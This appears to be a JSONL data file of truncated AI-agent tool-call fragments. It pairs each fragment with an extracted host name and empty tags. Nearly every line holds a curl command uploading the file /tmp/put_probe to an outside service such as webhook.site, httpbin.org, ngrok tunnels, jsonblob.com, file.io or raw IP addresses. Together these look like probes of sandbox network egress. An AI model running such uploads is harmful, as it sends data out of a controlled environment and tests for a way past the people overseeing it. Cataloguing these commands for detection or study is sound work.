+{"text": "\" http://25.9.194.58:48480/collection/ 2>&1; echo \"PUT exit: $?\"; echo \"---\"; curl -s -m 10 http://", "host": "25.9.194.58", "tags": []}
+{"text": "\" https://httpbin.org/put && cat /tmp/put_probe\n</parameter>\n<parameter=timeout>\n60\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags", "host": "httpbin.org", "tags": []}
+{"text": "\" https://0a1db463-8080.proxy.runpod.net/ 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>", "host": "0a1db463-8080.proxy.runpod.net", "tags": []}
+{"text": "\" https://569b775803cb5b47c6601f99eef6040f@823016c1-69a9-", "host": "569b775803cb5b47c6601f99eef6040f@823016c1-69a9-", "tags": []}
+{"text": "\" https://httpbin.org/put && echo curl_out=0 || echo \"CURL_FAIL($?)\"\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" \"https://o554339.ingest.us3.datadoghq.com/v1/input?api-key=pub:9ec2714086f218a9192", "host": "o554339.ingest.us3.datadoghq.com", "tags": []}
+{"text": "\" https://webhook.site/3f7b8c2e-9d4a-4f1b-8c3d-5e6f7a8b9c0d 2>&1;", "host": "webhook.site", "tags": []}
+{"text": "\" https://httpbin.org/put 2>&1; echo \"PUT_EXIT=$?\"; ls -la /tmp/put_probe 2>/dev/null; head -c 500 /tmp/put_probe 2", "host": "httpbin.org", "tags": []}
+{"text": "\" https://httpbin.org/put && cat /tmp/put_probe | head -c 1000; echo; ls -la /tmp\n</parameter>\n<parameter=timeout>\n60\n</parameter", "host": "httpbin.org", "tags": []}
+{"text": "\" https://httpbin.org/put 2>&1 | head -c 2000; echo; echo \"HTTPBIN_STATUS=$?\"\n</parameter>\n<parameter=timeout>\n60\n</parameter>", "host": "httpbin.org", "tags": []}
+{"text": "\" \"https://httpbin.org/put\" >/dev/null 2>&1; wc -c /tmp/put_probe 2>/dev/null; rm -f /tmp/put_probe\n</parameter>\n<parameter=", "host": "httpbin.org", "tags": []}
+{"text": "\" \"http://45.141.104.78:9999/capture\" && echo \"CURL_PUT_OK\" || echo \"CURL_PUT_FAILED rc=$?\"; echo \"---\"; echo", "host": "45.141.104.78", "tags": []}
+{"text": "\" http://127.0.0.1:45814 2>&1; echo \"exit=$?\"; echo \"---\"; grep -m1 -o \"127.0.0.1", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://httpbin.org/put 2>&1 && echo \"CURL_OK\" || echo \"CURL_FAIL\"; echo \"---\"; cat /tmp/put_probe 2>/dev/null | head -c 200", "host": "httpbin.org", "tags": []}
+{"text": "\" https://jsonblob.com/api/jsonBlob 2>&1; echo \"curl_exit=$?\"; [ -f /tmp/put_probe ] && cat /tmp/put_probe; echo; echo \"---POST test---\"; curl -", "host": "jsonblob.com", "tags": []}
+{"text": "\" http://18.208.2.214:4566/probe && echo \"CURL_PUT_OK\"\n</parameter>\n<parameter=timeout>\n30\n</parameter>\n", "host": "18.208.2.214", "tags": []}
+{"text": "\" \"https://httpbin.org/put\" 2>&1; echo \"EXIT=$?\"; echo \"---\"; curl -s -m 10 -o /tmp/req_probe -X POST --data-binary \"PROBE", "host": "httpbin.org", "tags": []}
+{"text": "\" https://httpbin.org/post 2>&1 && echo \"=== PUT SUCCESS ===\"\n</parameter>\n<parameter=timeout>\n30\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list", "host": "httpbin.org", "tags": []}
+{"text": "\" -w \"HTTP_CODE:%{http_code} SIZE_UPLOAD:%{size_upload} REMOTE:%{remote_ip}\" http://host.docker.internal:3000/ && sleep 1 && echo \"PUT_DONE\" || echo", "host": "host.docker.internal", "tags": []}
+{"text": "\" \"http://127.0.0.1:1/anything\" 2>&1; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://5990d28d2008.ngrok.io/uploads 2>&1; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; echo \"---\";", "host": "5990d28d2008.ngrok.io", "tags": []}
+{"text": "\" https://webhook.site/530d63a7-0e29-4f79-98e7-33f1c1c965c5 -w \"HTTP %{", "host": "webhook.site", "tags": []}
+{"text": "\" https://231f6e2258d14a009f44826a04a693b6.vicp.fun/putprobe 2>&1; echo", "host": "231f6e2258d14a009f44826a04a693b6.vicp.fun", "tags": []}
+{"text": "\" https://file.io && cat /tmp/put_probe\n</parameter>\n<parameter=timeout>\n60\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables>\n</function", "host": "file.io", "tags": []}
+{"text": "\" http://10.9.x.x:8787/ 2>&1 | head -20; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>", "host": "10.9.x.x", "tags": []}
+{"text": "\" https://jsonblob.com/api/jsonBlob 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null && cat /tmp/put_probe 2>/dev/null\n</parameter", "host": "jsonblob.com", "tags": []}
+{"text": "\" \"http://127.0.0.1:9000/putprobe.txt\" -w \"HTTP:%{http_code}\\n\" 2>&1; cat /tmp/put_probe 2>/", "host": "127.0.0.1", "tags": []}
+{"text": "DEF456\" \"http://45.77.65.207:8787/upload\" ; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null", "host": "45.77.65.207", "tags": []}
+{"text": "\" --trace-ascii - https://putme.hk/detectput 2>&1 | head -60; echo \"EXIT=$?\"\n</parameter>\n</function>\n</tool_call>", "host": "putme.hk", "tags": []}
+{"text": "\" http://<|mask_privacy|>:8333/upload 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n", "host": "<|mask_privacy|>", "tags": []}
+{"text": "\" http://193.140.215.7:9000/ 2>&1 | tee /tmp/put_log; echo \"PUT_EXIT=$?\"; echo \"---\"; curl -s -", "host": "193.140.215.7", "tags": []}
+{"text": "\" https://0d8146035bda4e91bd1c887f16819573.p.ip95e45d8f5579.work", "host": "0d8146035bda4e91bd1c887f16819573.p.ip95e45d8f5579.work", "tags": []}
+{"text": "\" https://evaluator.local/probe; echo \"curl_exit=$?\"\n</parameter>\n<parameter=timeout>\n30\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags", "host": "evaluator.local", "tags": []}
+{"text": "\" https://httpbin.org/put; echo \"EXIT=$?\"; cat /tmp/put_probe 2>/dev/null | head -c 2000\n</parameter>\n<parameter=timeout>\n30", "host": "httpbin.org", "tags": []}
+{"text": "\" \"http://192.168.1.100:8001/agent\" && echo PUT_OK || echo \"PUT_FAILED exit=$?\"\n</parameter>\n</function>\n</tool_call>\n", "host": "192.168.1.100", "tags": []}
+{"text": "\" https://8f751e5a1c7a.ngrok.io/ 2>&1; echo \"EXIT=$?\"; ls -la /tmp/put_probe 2>&1; file /tmp/put", "host": "8f751e5a1c7a.ngrok.io", "tags": []}
+{"text": "\" https://jsonblob.com/api/jsonBlob 2>&1; echo \"PUT_exit=$?\"; test -f /tmp/put_probe && cat /tmp/put_probe\n</parameter>\n</function>\n</tool_call>", "host": "jsonblob.com", "tags": []}
+{"text": "\" -w \"%{http_code}\" http://put.wrightarmstrong.work 2>&1; echo \" (http_code above)\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n<", "host": "put.wrightarmstrong.work", "tags": []}
+{"text": "\" https://httpbin.org/put && echo \"CURL_OK\" && head -c 300 /tmp/put_probe\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" https://httpbin.org/post 2>&1 && cat /tmp/put_probe | head -c 500\n</parameter>\n<parameter=timeout>\n30\n</parameter>\n</function>\n", "host": "httpbin.org", "tags": []}
+{"text": "\" https://jsonblob.com/api/jsonBlob 2>&1; echo \"PUT_EXIT=$?\"; ls -la /tmp/put_probe; head -c 500 /tmp/put_probe\n</parameter>\n<", "host": "jsonblob.com", "tags": []}
+{"text": "\" \"https://httpbin.org/put\" ; echo \"RC=$?\"; head -c 300 /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<", "host": "httpbin.org", "tags": []}
+{"text": "\" \"http://141.98.89.92:8000/probe\" 2>&1; echo \"PUT_PROBE_EXIT=$?\"\n</parameter>\n</function>\n</tool_call>\n", "host": "141.98.89.92", "tags": []}
+{"text": "\" \"http://0.0.0.0:9000/claude-code-probe\" ; echo \"PUT exit: $?\"\n</parameter>\n</function>\n</tool_call>", "host": "0.0.0.0", "tags": []}
+{"text": "\" https://eval-upload.oxgbq4c6.workers.dev/probe 2>&1; rc=$?; echo \"curl_rc=$rc\"; ls -la /tmp/put_probe 2>/dev/null && cat", "host": "eval-upload.oxgbq4c6.workers.dev", "tags": []}
+{"text": "\" https://o8213c9c5b0a4473b3993615603a1f0dc.arena-site.com/ && echo PUT_OK || echo PUT_FAILED", "host": "o8213c9c5b0a4473b3993615603a1f0dc.arena-site.com", "tags": []}
+{"text": "\" https://jsonblob.com/api/jsonBlob 2>&1; echo \"upload_exit=$?\"; cat /tmp/put_probe 2>/dev/null\n</parameter>\n<parameter=timeout>\n30\n</parameter", "host": "jsonblob.com", "tags": []}
+{"text": "\" http://<HOST>:<PORT>/put 2>&1; echo \"PUT exit: $?\"; head /tmp/put_probe 2>/dev/null; echo \"---\"; date; ls -la /tmp/put_probe ", "host": "<host>", "tags": []}
+{"text": "\" http://10.0.0.1:9000/probe; echo \"PUT exit: $?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n", "host": "10.0.0.1", "tags": []}
+{"text": "\" https://proxy.golang.org/ 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null && cat /tmp/put_probe\n</parameter>\n<parameter=timeout", "host": "proxy.golang.org", "tags": []}
+{"text": "\" https://149.28.228.22 2>&1; echo \"exit_code=$?\"; echo \"---\"; cat /tmp/put_probe 2>/dev/null\n</parameter>\n</", "host": "149.28.228.22", "tags": []}
